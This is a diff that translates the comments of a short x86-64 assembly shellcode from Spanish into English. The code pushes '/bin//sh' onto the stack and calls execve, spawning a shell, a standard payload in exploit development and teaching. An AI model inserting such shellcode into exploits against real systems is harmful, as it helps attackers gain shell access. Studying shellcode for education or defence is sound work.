@@ -4,12 +4,12 @@ section .text
 _start:
     xor rsi, rsi
     mul rsi
-    mov rbx, 0x68732f2f6e69622f	; Cadena que contiene "/bin//sh". Que posea 2 "/" no afecta a la función.
-    push rax			; Insertamos en el stack un terminador nulo
-    push rbx			; Insertamos en el stack la cadena /bin/sh
+    mov rbx, 0x68732f2f6e69622f	; String that contains "/bin//sh". Having two "/" does not affect the function.
+    push rax			; Insert a null terminator into the stack
+    push rbx			; Insert the string "/bin//sh" into the stack
 
-    push rsp			; Insertamos la cadena "/bin//sh" en el stack
-    pop rdi			; Sacamos el último valor que copiamos en el stack ("/bin//sh") y lo insertamos en "rdi"
+    push rsp			; Insert the string "/bin//sh" into the stack
+    pop rdi			; Pop the last value we pushed into the stack ("/bin//sh") put it into "rdi"
 
-    mov al, 59			; Se va a realizar una syscall a "execve"
-    syscall			; Se ejecuta la syscall
+    mov al, 59			; Set the syscall function to "execve"
+    syscall			; Execute the syscall
